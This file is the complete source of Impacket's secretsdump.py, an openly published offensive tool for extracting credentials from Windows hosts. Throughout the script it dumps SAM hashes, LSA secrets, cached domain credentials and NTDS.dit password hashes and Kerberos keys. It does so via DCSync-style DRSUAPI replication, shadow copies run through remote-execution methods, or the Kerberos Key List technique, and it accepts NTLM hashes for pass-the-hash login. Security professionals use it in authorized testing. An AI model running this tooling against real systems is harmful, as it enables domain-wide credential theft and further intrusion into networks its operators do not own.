#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Performs various techniques to dump hashes from the
#   remote machine without executing any agent there.
#   For SAM and LSA Secrets (including cached creds)
#   we try to read as much as we can from the registry
#   and then we save the hives in the target system
#   (%SYSTEMROOT%\\Temp dir) and read the rest of the
#   data from there.
#   For NTDS.dit we either:
#       a. Get the domain users list and get its hashes
#          and Kerberos keys using [MS-DRDS] DRSGetNCChanges()
#          call, replicating just the attributes we need.
#       b. Extract NTDS.dit via vssadmin executed  with the
#          smbexec approach.
#          It's copied on the temp dir and parsed remotely.
#
#   The script initiates the services required for its working
#   if they are not available (e.g. Remote Registry, even if it is
#   disabled). After the work is done, things are restored to the
#   original state.
#
# Author:
#   Alberto Solino (@agsolino)
#
# References:
#   Most of the work done by these guys. I just put all
#   the pieces together, plus some extra magic.
#
#   - https://github.com/gentilkiwi/kekeo/tree/master/dcsync
#   - https://moyix.blogspot.com.ar/2008/02/syskey-and-sam.html
#   - https://moyix.blogspot.com.ar/2008/02/decrypting-lsa-secrets.html
#   - https://moyix.blogspot.com.ar/2008/02/cached-domain-credentials.html
#   - https://web.archive.org/web/20130901115208/www.quarkslab.com/en-blog+read+13
#   - https://code.google.com/p/creddump/
#   - https://lab.mediaservice.net/code/cachedump.rb
#   - https://insecurety.net/?p=768
#   - https://web.archive.org/web/20190717124313/http://www.beginningtoseethelight.org/ntsecurity/index.htm
#   - https://www.exploit-db.com/docs/english/18244-active-domain-offline-hash-dump-&-forensic-analysis.pdf
#   - https://www.passcape.com/index.php?section=blog&cmd=details&id=15
#

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import sys

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.smbconnection import SMBConnection
from impacket.ldap.ldap import LDAPConnection, LDAPSessionError

from impacket.examples.secretsdump import (
    LocalOperations,
    RemoteOperations,
    SAMHashes,
    LSASecrets,
    NTDSHashes,
    KeyListSecrets,
)
from impacket.krb5.keytab import Keytab

try:
    input = raw_input
except NameError:
    pass


class DumpSecretsOptions:
    """Using a `DumpSecretsOptions` class to store all optional arguments and their default value."""

    def __init__(
        self,
        use_vss=None,
        use_keylist=None,
        target_ip=None,
        aesKey=None,
        rodcKey=None,
        rodcNo=None,
        system=None,
        bootkey=None,
        security=None,
        sam=None,
        ntds=None,
        history=None,
        outputfile=None,
        k=None,
        just_dc=None,
        just_dc_ntlm=None,
        just_dc_user=None,
        ldapfilter=None,
        pwd_last_set=None,
        user_status=None,
        resumefile=None,
        hashes=None,
        dc_ip=None,
        exec_method=None,
    ):
        self.use_vss = use_vss
        self.use_keylist = use_keylist
        self.target_ip = target_ip
        self.aesKey = aesKey
        self.rodcKey = rodcKey
        self.rodcNo = rodcNo
        self.system = system
        self.bootkey = bootkey
        self.security = security
        self.sam = sam
        self.ntds = ntds
        self.history = history
        self.outputfile = outputfile
        self.k = k
        self.just_dc = just_dc
        self.just_dc_ntlm = just_dc_ntlm
        self.just_dc_user = just_dc_user
        self.ldapfilter = ldapfilter
        self.pwd_last_set = pwd_last_set
        self.user_status = user_status
        self.resumefile = resumefile
        self.dc_ip = dc_ip
        self.exec_method = exec_method
        self.__hashes = hashes
        self.lmhash = ""
        self.nthash = ""
        if hashes is not None:
            self.lmhash, self.nthash = hashes.split(":")

    @property
    def hashes(self) -> str:
        return self.__hashes

    @hashes.setter
    def hashes(self, value: str):
        if value is not None:
            self.__hashes = value
            self.lmhash, self.nthash = value.split(":")
        else:
            self.lmhash, self.nthash = "", ""

    def reset(self, keep_ip: bool = False) -> None:
        """Set all members to their initial value."""
        if not keep_ip:
            self.target_ip = None

        self.use_vss = False
        self.use_keylist = False
        self.aesKey = None
        self.rodcKey = None
        self.rodcNo = None
        self.system = None
        self.bootkey = None
        self.security = None
        self.sam = None
        self.ntds = None
        self.history = False
        self.outputfile = None
        self.k = False
        self.just_dc = False
        self.just_dc_ntlm = False
        self.just_dc_user = None
        self.ldapfilter = None
        self.pwd_last_set = False
        self.user_status = False
        self.resumefile = None
        self.dc_ip = None
        self.exec_method = None
        self.hashes = None
        self.lmhash = ""
        self.nthash = ""


class DumpSecrets:
    def __init__(
        self,
        remoteName: str,
        username: str = "",
        password: str = "",
        domain: str = "",
        options: DumpSecretsOptions = None,
    ):
        """
        DumpSecrets constructor.

        Because the `options` parameter is a reference to the `DumpSecretsOptions` instance
        you can modify the DumpSecretsOptions instance and have the changes reflected
        in the instanciated object.

        From 'LAB.CORP.LOCAL/DC0$@10.10.10.120':
            - remoteName = 10.10.10.120
            - username = DC0$
            - password = ''
            - domain = LAB.CORP.LOCAL

        Args:
            remoteName (str): The remote name of the target. Could be both ip or NetBIOS name of the machine.
            username (str, optional): User name. Defaults to "".
            password (str, optional): User password. Defaults to "".
            domain (str, optional): Domain name (e.g. 'LAB.CORP.LOCAL'). Defaults to "".
            options (DumpSecretsOptions, optional): Options. Defaults to None.
        """
        if options is None:
            options = DumpSecretsOptions()

        self.__remoteName = remoteName
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__options = options

        self.__smbConnection = None
        self.__ldapConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__KeyListSecrets = None
        self.__noLMHash = True
        self.__isRemote = True
        self.__canProcessSAMLSA = True

    def connect(self):
        self.__smbConnection = SMBConnection(
            self.__remoteName, self.__options.target_ip
        )
        if self.__options.k:
            self.__smbConnection.kerberosLogin(
                self.__username,
                self.__password,
                self.__domain,
                self.__options.lmhash,
                self.__options.nthash,
                self.__options.aesKey,
                self.__options.dc_ip,
            )
        else:
            self.__smbConnection.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__options.lmhash,
                self.__options.nthash,
            )

    def ldapConnect(self):
        if self.__options.k:
            self.__target = self.__options.target_ip
        else:
            if self.__options.dc_ip is not None:
                self.__target = self.__options.dc_ip
            else:
                self.__target = self.__domain

        # Create the baseDN
        if self.__domain:
            domainParts = self.__domain.split(".")
        else:
            domain = self.__target.split(".", 1)[-1]
            domainParts = domain.split(".")
        self.baseDN = ""
        for i in domainParts:
            self.baseDN += "dc=%s," % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]

        try:
            self.__ldapConnection = LDAPConnection(
                "ldap://%s" % self.__target, self.baseDN, self.__options.dc_ip
            )
            if self.__options.k is not True:
                self.__ldapConnection.login(
                    self.__username,
                    self.__password,
                    self.__domain,
                    self.__options.lmhash,
                    self.__options.nthash,
                )
            else:
                self.__ldapConnection.kerberosLogin(
                    self.__username,
                    self.__password,
                    self.__domain,
                    self.__options.lmhash,
                    self.__options.nthash,
                    self.__options.aesKey,
                    kdcHost=self.__options.dc_ip,
                )
        except LDAPSessionError as e:
            if str(e).find("strongerAuthRequired") >= 0:
                # We need to try SSL
                self.__ldapConnection = LDAPConnection(
                    "ldaps://%s" % self.__target, self.baseDN, self.__options.dc_ip
                )
                if self.__options.k is not True:
                    self.__ldapConnection.login(
                        self.__username,
                        self.__password,
                        self.__domain,
                        self.__options.lmhash,
                        self.__options.nthash,
                    )
                else:
                    self.__ldapConnection.kerberosLogin(
                        self.__username,
                        self.__password,
                        self.__domain,
                        self.__options.lmhash,
                        self.__options.nthash,
                        self.__options.aesKey,
                        kdcHost=self.__options.dc_ip,
                    )
            else:
                raise

    def dump(self):
        try:
            if self.__remoteName.upper() == "LOCAL" and self.__username == "":
                self.__isRemote = False
                self.__options.use_vss = True
                if self.__options.system:
                    localOperations = LocalOperations(self.__options.system)
                    bootKey = localOperations.getBootKey()
                    if self.__options.ntds is not None:
                        # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = localOperations.checkNoLMHashPolicy()
                else:
                    import binascii

                    bootKey = binascii.unhexlify(self.__options.bootkey)

            else:
                self.__isRemote = True
                bootKey = None
                if self.__options.ldapfilter is not None:
                    logging.info(
                        "Querying %s for information about domain users via LDAP"
                        % self.__domain
                    )
                    try:
                        self.ldapConnect()
                    except Exception as e:
                        logging.error("LDAP connection failed: %s" % str(e))
                try:
                    try:
                        self.connect()
                    except Exception as e:
                        if (
                            os.getenv("KRB5CCNAME") is not None
                            and self.__options.k is True
                        ):
                            # SMBConnection failed. That might be because there was no way to log into the
                            # target system. We just have a last resort. Hope we have tickets cached and that they
                            # will work
                            logging.debug(
                                "SMBConnection didn't work, hoping Kerberos will help (%s)"
                                % str(e)
                            )
                            pass
                        else:
                            raise

                    self.__remoteOps = RemoteOperations(
                        self.__smbConnection,
                        self.__options.k,
                        self.__options.dc_ip,
                        self.__ldapConnection,
                    )
                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                    if (
                        self.__options.just_dc is False
                        and self.__options.just_dc_ntlm is False
                        and self.__options.use_keylist is False
                        or self.__options.use_vss is True
                    ):
                        self.__remoteOps.enableRegistry()
                        bootKey = self.__remoteOps.getBootKey()
                        # Let's check whether target system stores LM Hashes
                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
                except Exception as e:
                    self.__canProcessSAMLSA = False
                    if (
                        str(e).find("STATUS_USER_SESSION_DELETED")
                        and os.getenv("KRB5CCNAME") is not None
                        and self.__options.k is True
                    ):
                        # Giving some hints here when SPN target name validation is set to something different to Off
                        # This will prevent establishing SMB connections using TGS for SPNs different to cifs/
                        logging.error(
                            "Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user"
                        )
                    else:
                        logging.error("RemoteOperations failed: %s" % str(e))

            # If the KerberosKeyList method is enable we dump the secrets only via TGS-REQ
            if self.__options.use_keylist is True:
                try:
                    self.__KeyListSecrets = KeyListSecrets(
                        self.__domain,
                        self.__remoteName,
                        self.__options.rodcNo,
                        self.__options.rodcKey,
                        self.__remoteOps,
                    )
                    self.__KeyListSecrets.dump()
                except Exception as e:
                    logging.error(
                        "Something went wrong with the Kerberos Key List approach.: %s"
                        % str(e)
                    )
            else:
                # If RemoteOperations succeeded, then we can extract SAM and LSA
                if (
                    self.__options.just_dc is False
                    and self.__options.just_dc_ntlm is False
                    and self.__canProcessSAMLSA
                ):
                    try:
                        if self.__isRemote is True:
                            SAMFileName = self.__remoteOps.saveSAM()
                        else:
                            SAMFileName = self.__options.sam

                        self.__SAMHashes = SAMHashes(
                            SAMFileName, bootKey, isRemote=self.__isRemote
                        )
                        self.__SAMHashes.dump()
                        if self.__options.outputfile is not None:
                            self.__SAMHashes.export(self.__options.outputfile)
                    except Exception as e:
                        logging.error("SAM hashes extraction failed: %s" % str(e))

                    try:
                        if self.__isRemote is True:
                            SECURITYFileName = self.__remoteOps.saveSECURITY()
                        else:
                            SECURITYFileName = self.__options.security

                        self.__LSASecrets = LSASecrets(
                            SECURITYFileName,
                            bootKey,
                            self.__remoteOps,
                            isRemote=self.__isRemote,
                            history=self.__options.history,
                        )
                        self.__LSASecrets.dumpCachedHashes()
                        if self.__options.outputfile is not None:
                            self.__LSASecrets.exportCached(self.__options.outputfile)
                        self.__LSASecrets.dumpSecrets()
                        if self.__options.outputfile is not None:
                            self.__LSASecrets.exportSecrets(self.__options.outputfile)
                    except Exception as e:
                        if logging.getLogger().level == logging.DEBUG:
                            import traceback

                            traceback.print_exc()
                        logging.error("LSA hashes extraction failed: %s" % str(e))

                # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
                if self.__isRemote is True:
                    if (
                        self.__options.use_vss
                        and self.__remoteOps is not None
                        and self.__remoteOps.getRRP() is not None
                    ):
                        NTDSFileName = self.__remoteOps.saveNTDS()
                    else:
                        NTDSFileName = None
                else:
                    NTDSFileName = self.__options.ntds

                self.__NTDSHashes = NTDSHashes(
                    NTDSFileName,
                    bootKey,
                    isRemote=self.__isRemote,
                    history=self.__options.history,
                    noLMHash=self.__noLMHash,
                    remoteOps=self.__remoteOps,
                    useVSSMethod=self.__options.use_vss,
                    justNTLM=self.__options.just_dc_ntlm,
                    pwdLastSet=self.__options.pwd_last_set,
                    resumeSession=self.__options.resumefile,
                    outputFileName=self.__options.outputfile,
                    justUser=self.__options.just_dc_user,
                    ldapFilter=self.__options.ldapfilter,
                    printUserStatus=self.__options.user_status,
                )
                try:
                    self.__NTDSHashes.dump()
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback

                        traceback.print_exc()
                    if str(e).find("ERROR_DS_DRA_BAD_DN") >= 0:
                        # We don't store the resume file if this error happened, since this error is related to lack
                        # of enough privileges to access DRSUAPI.
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
                    logging.error(e)
                    if (
                        self.__options.just_dc_user or self.__options.ldapfilter
                    ) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                        logging.info(
                            "You just got that error because there might be some duplicates of the same name. "
                            "Try specifying the domain name for the user as well. It is important to specify it "
                            "in the form of NetBIOS domain name/user (e.g. contoso/Administratror)."
                        )
                    elif self.__options.use_vss is False:
                        logging.info(
                            "Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter"
                        )
                finally:
                    self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
            logging.error(e)
            if self.__NTDSHashes is not None:
                if isinstance(e, KeyboardInterrupt):
                    while True:
                        answer = input("Delete resume session file? [y/N] ")
                        if answer.upper() == "":
                            answer = "N"
                            break
                        elif answer.upper() == "Y":
                            answer = "Y"
                            break
                        elif answer.upper() == "N":
                            answer = "N"
                            break
                    if answer == "Y":
                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
                        if resumeFile is not None:
                            os.unlink(resumeFile)
            try:
                self.cleanup()
            except:
                pass

    def cleanup(self):
        logging.info("Cleaning up... ")
        # Need to reset this value to avoid chained dump problems
        self.__canProcessSAMLSA = True
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__KeyListSecrets:
            self.__KeyListSecrets.finish()

    @property
    def options(self) -> DumpSecretsOptions:
        """options getter

        Returns:
            DumpSecretsOptions: reference to DumpSecretsOptions instance
        """
        return self.__options

    @property
    def username(self) -> str:
        return self.__username

    @username.setter
    def username(self, new_username: str) -> None:
        self.__username = new_username

    @property
    def password(self) -> str:
        return self.__password

    @password.setter
    def password(self, new_password: str) -> None:
        self.__password = new_password


# Process command-line arguments.
if __name__ == "__main__":
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter("utf8")(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Performs various techniques to dump secrets from "
        "the remote machine without executing any agent there.",
    )

    parser.add_argument(
        "target",
        action="store",
        help="[[domain/]username[:password]@]<targetName or address> or LOCAL"
        " (if you want to parse local files)",
    )
    parser.add_argument(
        "-ts", action="store_true", help="Adds timestamp to every logging output"
    )
    parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
    parser.add_argument("-system", action="store", help="SYSTEM hive to parse")
    parser.add_argument("-bootkey", action="store", help="bootkey for SYSTEM hive")
    parser.add_argument("-security", action="store", help="SECURITY hive to parse")
    parser.add_argument("-sam", action="store", help="SAM hive to parse")
    parser.add_argument("-ntds", action="store", help="NTDS.DIT file to parse")
    parser.add_argument(
        "-resumefile",
        action="store",
        help="resume file name to resume NTDS.DIT session dump (only "
        "available to DRSUAPI approach). This file will also be used to keep updating the session's "
        "state",
    )
    parser.add_argument(
        "-outputfile",
        action="store",
        help="base output filename. Extensions will be added for sam, secrets, cached and ntds",
    )
    parser.add_argument(
        "-use-vss",
        action="store_true",
        default=False,
        help="Use the VSS method instead of default DRSUAPI",
    )
    parser.add_argument(
        "-rodcNo",
        action="store",
        type=int,
        help="Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)",
    )
    parser.add_argument(
        "-rodcKey",
        action="store",
        help="AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)",
    )
    parser.add_argument(
        "-use-keylist",
        action="store_true",
        default=False,
        help="Use the Kerb-Key-List method instead of default DRSUAPI",
    )
    parser.add_argument(
        "-exec-method",
        choices=["smbexec", "wmiexec", "mmcexec"],
        nargs="?",
        default="smbexec",
        help="Remote exec "
        "method to use at target (only when using -use-vss). Default: smbexec",
    )

    group = parser.add_argument_group("display options")
    group.add_argument(
        "-just-dc-user",
        action="store",
        metavar="USERNAME",
        help="Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. "
        "Implies also -just-dc switch",
    )
    group.add_argument(
        "-ldapfilter",
        action="store",
        metavar="LDAPFILTER",
        help="Extract only NTDS.DIT data for specific users based on an LDAP filter. "
        "Only available for DRSUAPI approach. Implies also -just-dc switch",
    )
    group.add_argument(
        "-just-dc",
        action="store_true",
        default=False,
        help="Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)",
    )
    group.add_argument(
        "-just-dc-ntlm",
        action="store_true",
        default=False,
        help="Extract only NTDS.DIT data (NTLM hashes only)",
    )
    group.add_argument(
        "-pwd-last-set",
        action="store_true",
        default=False,
        help="Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data",
    )
    group.add_argument(
        "-user-status",
        action="store_true",
        default=False,
        help="Display whether or not the user is disabled",
    )
    group.add_argument(
        "-history",
        action="store_true",
        help="Dump password history, and LSA secrets OldVal",
    )

    group = parser.add_argument_group("authentication")
    group.add_argument(
        "-hashes",
        action="store",
        metavar="LMHASH:NTHASH",
        help="NTLM hashes, format is LMHASH:NTHASH",
    )
    group.add_argument(
        "-no-pass", action="store_true", help="don't ask for password (useful for -k)"
    )
    group.add_argument(
        "-k",
        action="store_true",
        help="Use Kerberos authentication. Grabs credentials from ccache file "
        "(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use"
        " the ones specified in the command line",
    )
    group.add_argument(
        "-aesKey",
        action="store",
        metavar="hex key",
        help="AES key to use for Kerberos Authentication" " (128 or 256 bits)",
    )
    group.add_argument(
        "-keytab", action="store", help="Read keys for SPN from keytab file"
    )

    group = parser.add_argument_group("connection")
    group.add_argument(
        "-dc-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the domain controller. If "
        "ommited it use the domain part (FQDN) specified in the target parameter",
    )
    group.add_argument(
        "-target-ip",
        action="store",
        metavar="ip address",
        help="IP Address of the target machine. If omitted it will use whatever was specified as target. "
        "This is useful when target is the NetBIOS name and you cannot resolve it",
    )

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, remoteName = parse_target(options.target)

    if options.just_dc_user is not None or options.ldapfilter is not None:
        if options.use_vss is True:
            logging.error("-just-dc-user switch is not supported in VSS mode")
            sys.exit(1)
        elif options.resumefile is not None:
            logging.error(
                "resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch"
            )
            sys.exit(1)
        elif remoteName.upper() == "LOCAL" and username == "":
            logging.error("-just-dc-user not compatible in LOCAL mode")
            sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        logging.error(
            "resuming a previous NTDS.DIT dump session is not supported in VSS mode"
        )
        sys.exit(1)

    if options.use_keylist is True and (
        options.rodcNo is None or options.rodcKey is None
    ):
        logging.error(
            "Both the RODC ID number and the RODC key are required for the Kerb-Key-List approach"
        )
        sys.exit(1)

    if (
        remoteName.upper() == "LOCAL"
        and username == ""
        and options.resumefile is not None
    ):
        logging.error(
            "resuming a previous NTDS.DIT dump session is not supported in LOCAL mode"
        )
        sys.exit(1)

    if remoteName.upper() == "LOCAL" and username == "":
        if options.system is None and options.bootkey is None:
            logging.error(
                "Either the SYSTEM hive or bootkey is required for local parsing, check help"
            )
            sys.exit(1)
    else:
        if options.target_ip is None:
            options.target_ip = remoteName

        if domain is None:
            domain = ""

        if options.keytab is not None:
            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
            options.k = True

        if (
            password == ""
            and username != ""
            and options.hashes is None
            and options.no_pass is False
            and options.aesKey is None
        ):
            from getpass import getpass

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

    dumper = DumpSecrets(remoteName, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback

            traceback.print_exc()
        logging.error(e)
